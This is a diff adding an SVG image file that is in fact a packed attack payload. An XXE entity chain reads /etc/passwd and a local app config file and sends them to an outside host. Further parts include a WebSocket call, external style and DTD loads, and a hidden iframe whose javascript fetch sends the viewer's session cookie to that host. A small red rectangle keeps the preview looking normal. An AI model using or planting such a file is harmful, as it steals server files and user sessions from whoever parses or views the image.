@@ -1,0 +1,45 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://mtrf3.github.io/finding/log.php?data=%file;'>">
+    %eval;
+    %exfil;
+]>
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <!-- Try DNS exfiltration through external entities -->
+    <image xlink:href="https://UNIQUE-ID.mtrf3.github.io/finding/log.php" />
+    
+    <!-- Try WebSocket connection -->
+    <foreignObject>
+        <div xmlns="http://www.w3.org/1999/xhtml">
+            <script>
+                new WebSocket('wss://mtrf3.github.io/finding/ws').send(window.location.href)
+            </script>
+        </div>
+    </foreignObject>
+
+    <!-- SVG with external DTD to leak internal DTD -->
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
+        "https://mtrf3.github.io/finding/evil.dtd" [
+        <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/config.xml">
+        <!ENTITY % trigger SYSTEM "https://mtrf3.github.io/finding/trigger.dtd">
+        %trigger;
+    ]>
+
+    <!-- Try to load external style with IP leak -->
+    <style>
+        @import url('https://mtrf3.github.io/finding/style.css');
+        rect { fill: url('https://mtrf3.github.io/finding/log.php'); }
+    </style>
+
+    <!-- Hidden iframe for session leak attempt -->
+    <foreignObject width="0" height="0">
+        <iframe xmlns="http://www.w3.org/1999/xhtml" 
+                src="javascript:fetch('https://mtrf3.github.io/finding/log.php?session='+document.cookie)" 
+                style="display:none">
+        </iframe>
+    </foreignObject>
+
+    <!-- Visible rectangle to make preview work -->
+    <rect width="300" height="100" fill="red" />
+</svg>
